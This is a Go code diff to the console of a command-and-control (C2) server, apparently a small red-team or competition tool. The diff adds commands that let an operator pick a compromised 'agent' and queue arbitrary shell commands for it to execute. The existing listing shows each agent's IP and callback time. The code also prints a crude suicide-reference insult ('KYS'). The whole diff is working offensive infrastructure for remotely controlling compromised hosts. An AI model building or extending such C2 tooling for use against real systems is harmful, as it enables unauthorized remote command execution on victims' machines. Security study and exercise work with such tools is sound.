@@ -14,18 +14,21 @@ import (
 var helpMenu string = `
 
 CSC C2 V0.0.1 (2024-03-01)
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
 Help Menu :p							 	
 Commands:			Description			 
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
 help				Show this menu		 
 clear				Clear the console	 
-exit				Clean Exit of C2	 
+exit				Clean Exit of C2
+agent <agent_name>	Interact w/ target agent
+exec <command>		Execute command with current agent set by agent command
 agents				List all the agents
 history				See what you did fool
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
-
+_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
 `
+
+var CurrentAgent *Agent = nil
 
 func readHistoryFile() {
 	data, err := os.ReadFile(".history")
@@ -96,34 +99,66 @@ func StartCLI() {
 		}
 
 		command = strings.TrimSpace(command)
+		if CurrentAgent != nil {
+			rl.SetPrompt(fmt.Sprintf("[C2 %s] > ", CurrentAgent.ID))
+		} else {
+			rl.SetPrompt("[CS} > ")
+		}
 
-		switch command {
-		case "exit":
+		switch {
+		case command == "exit":
 			{
 				// do a thing
 				fmt.Println("[C2] Shutting down C2, gooodbye world...")
 				os.Exit(0)
 			}
-		case "help":
+		case command == "help":
 			{
 				fmt.Print(helpMenu)
 			}
-		case "clear":
+		case command == "clear":
 			{
 				if err := clearConsole(); err != nil {
 					fmt.Println(err)
 				}
 			}
-		case "agents":
+		case command == "agents":
 			{
 				fmt.Printf("%10s %10s %10s\n", "ID", "IP", "Last Call")
 				for _, agent := range AgentMap.Agents {
 					fmt.Printf("%10s %10s %5.0f seconds ago\n", agent.ID, agent.IP, time.Since(agent.LastCall).Seconds())
 				}
 			}
-		case "history":
-			// print everything from history file
-			readHistoryFile()
+		case command == "history":
+			{
+				// print everything from history file
+				readHistoryFile()
+			}
+		case strings.HasPrefix(command, "agent "):
+			{
+				agentId := strings.TrimPrefix(command, "agent ")
+				if agent := AgentMap.Get(agentId); agent != nil {
+					CurrentAgent = agent
+					// TODO: Log Agent call backs to file -- new file -- read since last login
+					rl.SetPrompt(fmt.Sprintf("[C2 %s] > ", CurrentAgent.ID))
+				} else {
+					fmt.Printf("Agent %s does not exist", agentId)
+				}
+			}
+		case strings.HasPrefix(command, "exec "):
+			{
+				if CurrentAgent == nil {
+					// TODO add log entry
+					fmt.Println("KYS")
+					fmt.Println("Seriously though...no agent selected, run agent command to specify one")
+					continue
+				}
+
+				cmd := strings.TrimPrefix(command, "exec ")
+				fullCmd := strings.Split(cmd, " ")
+
+				AgentMap.Enqueue(CurrentAgent.ID, fullCmd)
+			}
 		}
 
 	}
